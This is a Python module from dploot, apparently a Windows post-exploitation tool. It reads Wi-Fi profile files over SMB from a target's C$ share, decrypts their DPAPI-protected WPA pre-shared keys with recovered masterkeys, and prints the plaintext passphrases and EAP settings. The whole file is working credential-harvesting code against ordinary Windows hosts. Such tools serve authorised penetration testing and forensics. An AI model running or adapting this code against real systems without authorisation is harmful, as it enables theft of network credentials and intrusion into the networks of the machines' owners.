from binascii import unhexlify
import logging
import ntpath
from typing import Any, List
from xml.dom import minidom
from lxml import objectify

from dploot.lib.dpapi import decrypt_blob, find_masterkey_for_blob

from dploot.lib.smb import DPLootSMBConnection
from dploot.lib.target import Target
from dploot.triage.masterkeys import Masterkey

EAP_TYPES = {
            13:"EAP TLS",
            18:"EAP SIM",
            21:"EAP TTLS",
            23:"EAP AKA",
            25:"PEAP",
            50:"EAP AKA PRIME",
        }

class WifiCred:

    def __init__(self, ssid: str, auth: str, encryption: str, password: str = None, xml_data: Any = None) -> None:
        self.ssid = ssid
        self.auth = auth
        self.encryption = encryption
        self.password = password
        self.xml_data = xml_data

        # EAP params
        self.onex = None
        self.eap_host_config = None
        self.eap_type = None

        if self.auth == 'WPA2' or self.auth == 'WPA':
            self.onex = getattr(self.xml_data.MSM.security, "{http://www.microsoft.com/networking/OneX/v1}OneX")
            self.eap_host_config = getattr(self.onex.EAPConfig, "{http://www.microsoft.com/provisioning/EapHostConfig}EapHostConfig")
            eap_type = int(getattr(self.eap_host_config.EapMethod, "{http://www.microsoft.com/provisioning/EapCommon}Type"))
            self.eap_type = EAP_TYPES[eap_type]

    def dump(self) -> None:
        print('[WIFI]')
        print('SSID:\t\t%s' % self.ssid)
        if self.auth.upper() in ['WPAPSK', 'WPA2PSK']:
            print('AuthType:\t%s' % self.auth.upper())
            print('Encryption:\t%s' % self.encryption.upper())
            print('Preshared key:\t%s' % self.password.decode('latin-1'))
        elif self.auth.upper() in ['WPA', 'WPA2']:
            print('AuthType:\t%s EAP' % self.auth.upper())
            print('Encryption:\t%s' % self.encryption.upper())
            print('EAP Type:\t%s' % self.eap_type)
            print()
            self.dump_all_xml(self.eap_host_config)
        elif self.auth.upper() == 'OPEN':
            print('AuthType:\t%s' % self.auth.upper())
            print('Encryption:\t%s' % self.encryption.upper())
        print()

    def dump_all_xml(self,node, n: int = 0) -> None:
        key = node.tag
        if type(node) is objectify.ObjectifiedElement:
            key = key.split("}")[1] if '}' in key else key        
            print('  '*n+key+":")
            for element in node.iterchildren() :
                self.dump_all_xml(element, n+1)
        else:
            key = key.split("}")[1] if '}' in key else key 
            print("%s%s: %s" % ('  '*n, key, node.text))



    def dump_quiet(self) -> None:
        if self.auth.upper() == 'OPEN':
            print("[WIFI] %s - OPEN" % (self.ssid))
        if self.auth.upper() in ['WPAPSK', 'WPA2PSK']:
            print("[WIFI] %s - %s - Passphrase: %s" % (self.ssid, self.auth.upper(), self.password))
        else:
            print("[WIFI] %s - WPA EAP - %s" % (self.ssid, self.eap_type))

class WifiTriage:

    false_positive = ['.','..', 'desktop.ini','Public','Default','Default User','All Users']

    system_wifi_generic_path = "ProgramData\\Microsoft\\Wlansvc\\Profiles\\Interfaces"
    share = 'C$'

    def __init__(self, target: Target, conn: DPLootSMBConnection, masterkeys: List[Masterkey]) -> None:
        self.target = target
        self.conn = conn
        
        self.looted_files = dict()
        self.masterkeys = masterkeys

    def triage_wifi(self) -> List[WifiCred]:
        wifi_creds = list()
        try:
            wifi_dir = self.conn.remote_list_dir(self.share, self.system_wifi_generic_path)
            if wifi_dir is not None:
                for dir in wifi_dir:
                    if dir.is_directory() > 0 and dir.get_longname() not in self.false_positive:
                        wifi_interface_path = ntpath.join(self.system_wifi_generic_path,dir.get_longname())
                        wifi_interface_dir = self.conn.remote_list_dir(self.share, wifi_interface_path)
                        for file in wifi_interface_dir:
                            filename = file.get_longname()
                            if file.is_directory() == 0 and filename not in self.false_positive and filename[-4:] == '.xml':
                                wifi_interface_filepath = ntpath.join(wifi_interface_path, filename)
                                logging.info("Found Wifi connection file: \\\\%s\\%s\\%s" %  (self.target.address,self.share,wifi_interface_filepath))
                                wifi_interface_data = self.conn.readFile(self.share, wifi_interface_filepath)
                                self.looted_files[filename] = wifi_interface_data

                                main = objectify.fromstring(wifi_interface_data)
                                
                                ssid = main.SSIDConfig.SSID.name.text
                                auth_type = main.MSM.security.authEncryption.authentication.text
                                encryption = main.MSM.security.authEncryption.encryption.text

                                if auth_type == 'WPA2PSK' or auth_type == 'WPAPSK':
                                    
                                    dpapi_blob = main.MSM.security.sharedKey.keyMaterial
                                    masterkey = find_masterkey_for_blob(unhexlify(dpapi_blob.text), masterkeys=self.masterkeys)
                                    password = ''
                                    if masterkey is not None:
                                        password = decrypt_blob(unhexlify(dpapi_blob.text), masterkey=masterkey)
                                    wifi_creds.append(WifiCred(
                                        ssid=ssid,
                                        auth=auth_type,
                                        encryption=encryption,
                                        password=password,
                                        xml_data=main))
                                else:
                                    wifi_creds.append(WifiCred(
                                        ssid=ssid,
                                        auth=auth_type,
                                        encryption=encryption,
                                        xml_data=main))
                                    # onex = getattr(main.MSM.security, "{http://www.microsoft.com/networking/OneX/v1}OneX")
                                    # print(objectify.dump(onex.EAPConfig))
                                    # eap_host_config = getattr(onex.EAPConfig, "{http://www.microsoft.com/provisioning/EapHostConfig}EapHostConfig")
                                    # eap_type = getattr(eap_host_config.EapMethod, "{http://www.microsoft.com/provisioning/EapCommon}Type")
                                    # print(eap_type)
                                    # # onex = getattr(onex.EAPConfig, "{http://www.microsoft.com/networking/OneX/v1}EAPConfig")
                                    # # print(objectify.dump(onex))
                                    
                                    # import sys
                                    # sys.exit(1)

                                # xml_data = minidom.parseString(wifi_interface_data)
                                # ssid = xml_data.getElementsByTagName('SSID')[0].getElementsByTagName('name')[0].childNodes[0].data
                                # auth_type = xml_data.getElementsByTagName('authentication')[0].childNodes[0].data
                                # encryption = xml_data.getElementsByTagName('encryption')[0].childNodes[0].data
                                # if auth_type == 'WPA2PSK' or auth_type == 'WPAPSK': # WPA Personnal
                                #     dpapi_blob = xml_data.getElementsByTagName('keyMaterial')[0].childNodes[0].data
                                #     masterkey = find_masterkey_for_blob(unhexlify(dpapi_blob), masterkeys=self.masterkeys)
                                #     password = ''
                                #     if masterkey is not None:
                                #         password = decrypt_blob(unhexlify(dpapi_blob), masterkey=masterkey)
                                #     wifi_creds.append(WifiCred(ssid, auth_type, encryption=encryption,password=password))
                                # elif auth_type == 'WPA2' or auth_type == 'WPA': # WPA Entreprise
                                #     print('waza')
                                #     print(wifi_interface_data.decode('utf-8'))

                                #     eap_type = xml_data.getElementsByTagName('Type')[0].childNodes[0].data
                                #     eap_config = xml_data.getElementsByTagName('EAPConfig')
                                #     print(eap_config)
                                #     # eap_type = xml_data.getElementsByTagName('authMode')[0].childNodes[0].data

                                #     # https://learn.microsoft.com/en-us/windows/win32/nativewifi/wpa2-enterprise-with-peap-mschapv2-profile-sample
                                #     wifi_creds.append(WifiCred(ssid, auth_type, encryption=encryption,eap_type=eap_type))
                                # elif auth_type == 'open': # OPEN
                                #     wifi_creds.append(WifiCred(ssid, auth_type, encryption=encryption))
                                # else:
                                #     logging.debug('Unsupported authentication type: %s. Please open issue to improve the project!' % auth_type)
        except Exception as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
                logging.debug(str(e))
            pass
        return wifi_creds